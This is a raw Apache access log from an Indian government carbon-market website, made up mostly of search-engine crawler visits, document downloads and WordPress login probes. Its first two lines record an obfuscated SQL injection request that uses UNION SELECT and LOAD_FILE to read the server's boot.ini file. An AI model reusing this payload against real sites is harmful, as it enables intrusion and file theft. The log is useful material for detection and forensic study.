68.168.122.148 - - [30/May/2017:03:12:56 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f2f626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18120 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f2f626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
68.168.122.148 - - [30/May/2017:03:12:57 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18120 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
157.55.39.99 - - [30/May/2017:03:14:18 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:03:14:20 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:03:14:21 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:03:14:35 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.196.87.48 - - [30/May/2017:03:14:54 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
45.244.126.51 - - [30/May/2017:03:16:09 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
45.244.126.51 - - [30/May/2017:03:16:10 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.65.133 - - [30/May/2017:03:17:15 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=Small&sdt=&edt=&exec=&page=22 HTTP/1.1" 200 17260 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.185.223.87 - - [30/May/2017:03:19:16 +0530] "GET /approval_process.php HTTP/1.0" 200 25912 "http://cdmindia.gov.in/approval_process.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
146.185.223.87 - - [30/May/2017:03:19:17 +0530] "GET /registration.php HTTP/1.0" 200 28529 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
146.185.223.87 - - [30/May/2017:03:19:18 +0530] "GET /registration.php HTTP/1.0" 200 28529 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
146.185.223.87 - - [30/May/2017:03:19:18 +0530] "GET /registration.php HTTP/1.0" 200 28529 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
146.185.223.87 - - [30/May/2017:03:19:19 +0530] "GET /registration.php HTTP/1.0" 200 28529 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
202.46.58.124 - - [30/May/2017:03:19:42 +0530] "GET /project_details_view_report.php?id=1102 HTTP/1.1" 200 13165 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
45.244.126.51 - - [30/May/2017:03:19:46 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
45.244.126.51 - - [30/May/2017:03:19:47 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.65.131 - - [30/May/2017:03:27:29 +0530] "GET /reports_list_details.php?id=fnxntyvmlpku&reporttype=&page=276 HTTP/1.1" 200 22149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
90.57.133.234 - - [30/May/2017:03:30:48 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Java/1.8.0_101"
66.249.65.129 - - [30/May/2017:03:32:21 +0530] "GET /project_details_view.php?id=1609 HTTP/1.1" 200 13990 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.130 - - [30/May/2017:03:36:40 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
90.57.234.23 - - [30/May/2017:03:39:09 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Java/1.8.0_101"
157.55.39.99 - - [30/May/2017:03:40:21 +0530] "GET /project_details_view.php?id=1385 HTTP/1.1" 200 15240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:03:40:41 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:03:40:41 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:03:40:43 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:03:40:48 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
211.0.154.123 - - [30/May/2017:03:41:40 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
66.249.65.131 - - [30/May/2017:03:42:53 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=96 HTTP/1.1" 200 21930 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.129 - - [30/May/2017:03:47:40 +0530] "GET /project_details_view.php?id=679&oid=1&page=46&reporttype=1 HTTP/1.1" 200 14417 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.51.82 - - [30/May/2017:03:48:48 +0530] "GET /project_details_view.php?id=1707 HTTP/1.1" 200 13725 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
156.220.127.12 - - [30/May/2017:03:49:51 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
156.220.127.12 - - [30/May/2017:03:49:51 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.52 - - [30/May/2017:03:49:59 +0530] "GET /project_details_view_report.php?id=998 HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:03:50:51 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:03:52:41 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [30/May/2017:03:55:07 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.133 - - [30/May/2017:03:57:58 +0530] "GET /reports_list_details.php?id=fnxntyvmlpku&reporttype=&page=287 HTTP/1.1" 200 22175 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:03:58:26 +0530] "GET /project_details_view.php?id=1557 HTTP/1.1" 200 14171 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
141.8.142.74 - - [30/May/2017:04:00:19 +0530] "GET /project_details_view_report.php?id=522 HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
202.46.57.164 - - [30/May/2017:04:03:20 +0530] "GET /project_details_view_report.php?id=1457 HTTP/1.1" 200 13216 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
68.180.228.167 - - [30/May/2017:04:10:47 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.167 - - [30/May/2017:04:10:48 +0530] "GET /project_details_view_report.php?id=940 HTTP/1.1" 200 13264 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
157.55.39.99 - - [30/May/2017:04:12:40 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:04:13:26 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:04:14:25 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16738 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:04:14:25 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:04:14:26 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:04:15:05 +0530] "GET /sitemap.php HTTP/1.1" 200 18469 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.52.174 - - [30/May/2017:04:17:53 +0530] "GET /project_details_view.php?id=1348 HTTP/1.1" 200 14712 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.65.133 - - [30/May/2017:04:23:03 +0530] "GET /project_details_view.php?id=2141&oid=&page=2&reporttype= HTTP/1.1" 200 13946 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:04:23:32 +0530] "GET /Approved_proj_reports_list_details.php?id=5&reporttype=1&scale=&sdt=&edt=&exec= HTTP/1.1" 200 13017 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.131 - - [30/May/2017:04:28:00 +0530] "GET /reports_list_details.php?id=Tamil%20Nadu&reporttype=2&page=5 HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
141.8.142.74 - - [30/May/2017:04:29:53 +0530] "GET /project_details_view_report.php?id=1221 HTTP/1.1" 200 13160 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
202.46.54.32 - - [30/May/2017:04:32:26 +0530] "GET /project_details_view_report.php?id=281 HTTP/1.1" 200 13082 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
195.22.127.139 - - [30/May/2017:04:32:48 +0530] "GET /project_details_view.php?id=1182 HTTP/1.1" 200 15388 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
157.55.39.130 - - [30/May/2017:04:33:06 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.55 - - [30/May/2017:04:33:11 +0530] "GET /uploads/315539216NOC%20Chitale.pdf HTTP/1.1" 200 845642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.54 - - [30/May/2017:04:33:20 +0530] "GET /uploads/315539216NOC%20Chitale.pdf HTTP/1.1" 200 845642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.129 - - [30/May/2017:04:38:16 +0530] "GET /project_details_view.php?id=1239 HTTP/1.1" 200 13958 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
131.253.25.163 - - [30/May/2017:04:41:39 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
117.199.73.143 - - [30/May/2017:04:42:01 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:01 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:02 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 4218569 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:06 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 65536 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:07 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 2810023 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:09 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 68658 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
117.199.73.143 - - [30/May/2017:04:42:10 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 2054396 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
66.249.65.131 - - [30/May/2017:04:43:09 +0530] "GET /project_details_view_report.php?id=1574 HTTP/1.1" 200 13287 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.133 - - [30/May/2017:04:43:12 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=Small&sdt=&edt=&exec=&page=35 HTTP/1.1" 200 17404 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:04:44:28 +0530] "GET /contactus.php HTTP/1.1" 200 18292 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:04:46:32 +0530] "GET /project_details_view.php?id=1010&oid=1&page=35&reporttype=1 HTTP/1.1" 200 15300 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.49.92 - - [30/May/2017:04:46:59 +0530] "GET /project_details_view_report.php?id=1338 HTTP/1.1" 200 13248 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.65.129 - - [30/May/2017:04:48:10 +0530] "GET /project_details_view_report.php?id=1062 HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.131 - - [30/May/2017:04:48:14 +0530] "GET /reports_list_details.php?id=Jammu%20&%20Kashmir&reporttype=2 HTTP/1.1" 200 16952 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.135.230.175 - - [30/May/2017:04:52:48 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
24.135.230.175 - - [30/May/2017:04:52:48 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.52 - - [30/May/2017:04:53:40 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:04:53:41 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:04:53:42 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:04:54:55 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:04:54:56 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:04:54:57 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:04:55:55 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19082 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:04:55:57 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:04:55:58 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:04:58:22 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=95 HTTP/1.1" 200 22154 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:05:07:10 +0530] "GET /project_details_view.php?id=2081 HTTP/1.1" 200 14233 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:07:25 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:07:26 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:05:07:30 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:05:07:30 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:05:07:35 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:05:07:36 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:05:07:36 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:07:40 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:07:40 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
141.8.142.74 - - [30/May/2017:05:09:37 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.142.74 - - [30/May/2017:05:09:41 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.183.1 - - [30/May/2017:05:10:05 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
46.12.254.131 - - [30/May/2017:05:13:52 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
46.12.254.131 - - [30/May/2017:05:13:51 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "https://www.google.gr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
46.12.254.131 - - [30/May/2017:05:13:52 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 4262185 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
46.12.254.131 - - [30/May/2017:05:13:56 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 65536 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
46.12.254.131 - - [30/May/2017:05:13:57 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 206 2808846 "http://www.cdmindia.gov.in/downloads/Carbon%20Market%20Roadmap.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
141.8.142.74 - - [30/May/2017:05:14:30 +0530] "GET /project_details_view_report.php?id=637 HTTP/1.1" 200 13227 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.99 - - [30/May/2017:05:14:36 +0530] "GET /project_details_view.php?id=913 HTTP/1.1" 200 14592 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [30/May/2017:05:17:03 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.131 - - [30/May/2017:05:18:51 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=140 HTTP/1.1" 200 21704 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.133 - - [30/May/2017:05:21:38 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=136 HTTP/1.1" 200 21808 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.129 - - [30/May/2017:05:23:50 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=138 HTTP/1.1" 200 21695 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:05:24:00 +0530] "GET /reports_new.php HTTP/1.1" 200 22411 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
